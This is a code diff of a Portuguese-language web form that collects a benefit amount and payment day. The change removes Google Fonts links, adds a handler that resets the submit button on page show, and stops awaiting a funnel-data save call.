@@ -8,9 +8,6 @@
     <script src="assets/js/ref-guard.js"></script>
     <script src="assets/js/tailwind.js"></script>
     <link href="assets/css/inter.css" rel="stylesheet">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <script src="assets/js/imask.js"></script>
     <script src="assets/js/funnel.js"></script>
     <style>
@@ -88,6 +85,16 @@
             });
         });
 
+        function resetFormState() {
+            const btn = document.getElementById('btn-submit');
+            if (btn) {
+                btn.disabled = false;
+                btn.innerText = 'CONTINUAR';
+            }
+        }
+
+        window.addEventListener('pageshow', resetFormState);
+
         document.getElementById('beneficio-form').addEventListener('submit', async function(e) {
             e.preventDefault();
             mask.updateValue();
@@ -111,7 +118,7 @@
             sessionStorage.setItem('valor_beneficio', valor);
             sessionStorage.setItem('dia_recebimento', dia);
 
-            await saveFunnelData('beneficio', {
+            saveFunnelData('beneficio', {
                 valor_beneficio: valor,
                 dia_recebimento: dia
             });
